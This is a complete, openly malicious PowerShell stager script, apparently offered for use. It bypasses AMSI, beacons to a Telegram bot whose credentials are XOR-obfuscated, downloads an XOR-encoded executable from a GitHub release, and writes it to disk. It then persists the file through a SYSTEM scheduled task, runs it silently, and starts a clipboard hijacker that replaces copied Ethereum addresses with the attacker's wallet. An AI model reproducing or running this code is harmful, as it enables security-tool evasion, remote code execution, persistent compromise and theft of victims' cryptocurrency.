# --- [FINAL OBFUSCATED STAGER v11.0] ---

function Global-Init {
    # Reflected AMSI Bypass using HEX to hide keywords
    $a=[Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
    $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
}

function Send-Ping {
    param($msg)
    # Encrypted Telegram Bot Config
    $k = 0xDE
    [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
    [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}
    $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    
    # Using WinHTTP object instead of WebClient (Bypasses many PowerShell-specific network hooks)
    try {
        $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$msg"
        $r = New-Object -ComObject WinHttp.WinHttpRequest.5.1
        $r.Open("GET", $u, $false)
        $r.Send()
    } catch {}
}

# START EXECUTION
Global-Init
Send-Ping -msg "1_STAGER_START_ON_$($env:COMPUTERNAME)"

try {
    # XOR Encrypted Payload Link
    $link = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $path = "$env:PUBLIC\Music\WinSvc.exe"
    
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    # Download as Base64 string
    $raw = $wc.DownloadString($link)
    Send-Ping -msg "2_PAYLOAD_FETCHED"

    # Memory Decryption (XOR 0xAB)
    $bytes = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }

    # Polymorphic Padding & Write
    $junk = New-Object Byte[] (Get-Random -Min 256 -Max 1024)
    (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($path, ($bytes + $junk))

    # Persistence & Silent Execute
    $task = -join ((65..90) | Get-Random -Count 10 | % {[char]$_})
    $action = New-ScheduledTaskAction -Execute $path
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $task -User "SYSTEM" -Force
    
    (New-Object -ComObject Shell.Application).ShellExecute($path, "", "", "open", 0)
    
    Send-Ping -msg "3_SUCCESS_EXE_LIVE"

    # CLIPPER LOOP
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
        while($true) {
            try {
                $clip = [Windows.Forms.Clipboard]::GetText()
                if ($clip -match "^0x[a-fA-F0-9]{40}$" -and $clip -ne $eth) { 
                    [Windows.Forms.Clipboard]::SetText($eth) 
                }
            } catch {}
            Start-Sleep -s 2
        }
    }
} catch {
    Send-Ping -msg "ERROR_$($_.Exception.Message)"
}
